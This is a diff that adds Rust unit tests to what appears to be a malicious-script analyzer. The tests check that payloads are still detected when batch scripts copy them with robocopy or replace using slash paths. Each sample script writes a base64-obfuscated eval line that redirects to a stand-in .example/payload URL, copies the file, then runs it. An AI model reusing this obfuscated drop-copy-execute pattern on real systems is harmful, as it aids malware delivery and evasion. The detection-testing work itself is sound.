@@ -15571,6 +15571,23 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn robocopy_slash_paths_preserve_generated_script_content_for_later_execution() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktc2xhc2gtZGlyLmV4YW1wbGUvcGF5bG9hZCc=")) > C:/Work/original.js
+robocopy C:/Work C:/Temp original.js
+call C:/Temp/original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://robocopy-slash-dir.example/payload")
+            }),
+            "robocopy slash-path copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn robocopy_explicit_source_dir_does_not_use_unrelated_basename_content() {
         let report = analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktd3JvbmctYmFzZW5hbWUuZXhhbXBsZS9wYXlsb2FkJw==")) > D:\Other\original.js
@@ -15600,6 +15617,23 @@ call C:\Temp\original.js"#,
                 matches!(t, Trait::Download { src, .. } if src == "https://replace-dir-js.example/payload")
             }),
             "replace copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn replace_slash_directory_destination_preserves_generated_script_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcmVwbGFjZS1zbGFzaC1kaXIuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
+replace original.js C:/Temp
+call C:/Temp/original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://replace-slash-dir.example/payload")
+            }),
+            "replace slash-path copied generated JS content was not analyzed: {:?}",
             report.traits
         );
     }
